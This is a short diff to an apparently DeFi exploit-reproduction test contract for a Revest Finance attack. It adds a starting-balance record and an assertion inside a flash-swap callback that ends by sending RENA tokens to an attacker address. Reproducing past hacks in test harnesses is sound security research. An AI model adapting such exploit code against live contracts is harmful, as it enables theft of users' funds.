@@ -208,6 +208,7 @@ contract Exploit_RevestFinance is TestHarness {
 
     function uniswapV2Call(address , uint amount0, uint , bytes calldata ) external  {
         require(address(renaWethPair) == msg.sender, "Only callable by pair");
+        uint256 renaStartingBalnace = rena.balanceOf(address(this));
 
           address[] memory _recipients = new address[](1);
         _recipients[0] = address(this);
@@ -241,6 +242,7 @@ contract Exploit_RevestFinance is TestHarness {
 
         uint256 renaEndingBalance = rena.balanceOf(address(this));
         emit log_named_decimal_uint("Rena Ending Profit", renaEndingBalance, 18);
+        assertGe(renaEndingBalance, renaStartingBalnace);
         rena.transfer(attacker, renaEndingBalance);
     }
 
